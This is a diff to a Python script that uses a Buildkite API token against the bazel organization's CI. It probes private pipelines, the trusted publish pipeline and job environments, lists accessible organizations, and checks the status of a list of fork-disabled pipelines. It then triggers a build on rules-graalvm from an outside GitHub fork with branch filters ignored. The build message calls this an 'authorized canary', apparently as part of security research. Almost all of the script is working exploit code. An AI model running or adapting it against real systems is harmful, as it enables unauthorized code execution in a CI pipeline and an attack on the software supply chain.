@@ -10,8 +10,9 @@ import urllib.request
 
 
 NONCE = "hi_from_robert:d21766e5488dc00f"
-BFADMIN_COMMIT = "a3842504336585fb9a51046a10df2a5f8e3e3bda"
-BFADMIN_BRANCH = "b0244-hi-from-robert-d21766e5488dc00f"
+CANARY_COMMIT = "5209f877c8074697e6267211819fcdd46ec098e0"
+CANARY_BRANCH = "b0244-hi-from-robert-d21766e5488dc00f"
+CANARY_PIPELINE = "rules-graalvm"
 API = "https://api.buildkite.com/v2"
 
 
@@ -34,7 +35,10 @@ def request(token, method, path, payload=None):
     try:
         with urllib.request.urlopen(req, timeout=20) as response:
             raw = response.read()
-            parsed = json.loads(raw) if raw else None
+            try:
+                parsed = json.loads(raw) if raw else None
+            except json.JSONDecodeError:
+                parsed = {"text_response": True}
             return response.status, parsed
     except urllib.error.HTTPError as error:
         raw = error.read()
@@ -98,7 +102,9 @@ def main():
 
         probes = {
             "current_pipeline": "/organizations/bazel/pipelines/bazel-bazel-github-presubmit",
-            "fork_disabled_pipeline": "/organizations/bazel/pipelines/buildfarm-admin-farmer",
+            "fork_disabled_pipeline": "/organizations/bazel/pipelines/" + CANARY_PIPELINE,
+            "private_buildfarm_admin": "/organizations/bazel/pipelines/buildfarm-admin-farmer",
+            "private_sandboxed_api": "/organizations/bazel/pipelines/sandboxed-api",
             "trusted_publish_pipeline": "/organizations/bazel-trusted/pipelines/publish-bazel-binaries",
             "own_job_env": "/organizations/bazel/jobs/" + job_id + "/env",
             "own_job_artifacts": "/organizations/bazel/jobs/" + job_id + "/artifacts",
@@ -114,20 +120,55 @@ def main():
                     entry["keys"] = sorted(environment.keys())
             result["reads"][name] = entry
 
+        org_status, orgs = request(token, "GET", "/organizations")
+        org_slugs = {
+            organization.get("slug")
+            for organization in orgs
+            if isinstance(organization, dict)
+        } if isinstance(orgs, list) else set()
+        result["organization_access"] = {
+            "status": org_status,
+            "count": len(org_slugs),
+            "bazel": "bazel" in org_slugs,
+            "bazel_trusted": "bazel-trusted" in org_slugs,
+        }
+
+        known_fork_disabled = (
+            "rules-graalvm",
+            "btwiuse-k0s",
+            "tools-android",
+            "subpar",
+            "sandboxed-api",
+            "buildfarm-admin-farmer",
+            "bcsgh-utilities",
+            "bcsgh-tbd",
+            "bcsgh-stl-to-ps",
+            "bcsgh-tbd-http",
+            "bcsgh-bazel-rules",
+        )
+        result["known_fork_disabled_pipeline_status"] = {}
+        for pipeline_slug in known_fork_disabled:
+            pipeline_status, _ = request(
+                token,
+                "GET",
+                "/organizations/bazel/pipelines/" + pipeline_slug,
+            )
+            result["known_fork_disabled_pipeline_status"][pipeline_slug] = pipeline_status
+
         payload = {
-            "commit": BFADMIN_COMMIT,
-            "branch": BFADMIN_BRANCH,
+            "commit": CANARY_COMMIT,
+            "branch": CANARY_BRANCH,
             "message": "[authorized B-0244 canary] " + NONCE,
             "clean_checkout": True,
             "ignore_pipeline_branch_filters": True,
-            "pull_request_repository": "https://github.com/benr00t3d/bfadmin.git",
+            "pull_request_repository": "https://github.com/benr00t3d/rules_graalvm.git",
             "env": {"B0244_NONCE": NONCE},
         }
         list_status, builds = request(
             token,
             "GET",
-            "/organizations/bazel/pipelines/buildfarm-admin-farmer/builds"
-            + "?branch=" + BFADMIN_BRANCH + "&per_page=20",
+            "/organizations/bazel/pipelines/" + CANARY_PIPELINE + "/builds"
+            + "?branch=" + CANARY_BRANCH + "&per_page=20",
         )
         existing = None
         if list_status == 200 and isinstance(builds, list):
@@ -135,7 +176,7 @@ def main():
                 (
                     build
                     for build in builds
-                    if build.get("commit") == BFADMIN_COMMIT
+                    if build.get("commit") == CANARY_COMMIT
                     or build.get("message") == payload["message"]
                 ),
                 None,
@@ -148,7 +189,7 @@ def main():
             build_status, build_body = request(
                 token,
                 "POST",
-                "/organizations/bazel/pipelines/buildfarm-admin-farmer/builds",
+                "/organizations/bazel/pipelines/" + CANARY_PIPELINE + "/builds",
                 payload,
             )
             disposition = "created" if build_status == 201 else "rejected"
